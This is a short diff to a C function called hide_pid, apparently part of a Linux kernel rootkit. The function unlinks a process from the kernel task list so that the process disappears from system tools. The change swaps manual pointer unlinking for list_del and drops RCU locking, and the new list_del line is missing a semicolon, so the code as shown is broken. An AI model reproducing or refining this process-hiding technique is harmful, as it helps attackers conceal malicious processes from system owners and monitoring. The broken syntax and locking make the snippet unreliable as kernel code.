@@ -93,12 +93,11 @@ hide_pid(pid_t pid)
         return;
     }
 
-    rcu_read_lock();
     write_lock_irq(rwlock);
-	ts->tasks.prev->next = ts->tasks.next;
-	ts->tasks.next->prev = ts->tasks.prev;
+    list_del(&ts->tasks)
+	/* ts->tasks.prev->next = ts->tasks.next; */
+	/* ts->tasks.next->prev = ts->tasks.prev; */
     write_unlock_irq(rwlock);
-    rcu_read_unlock();
 }
 
 void
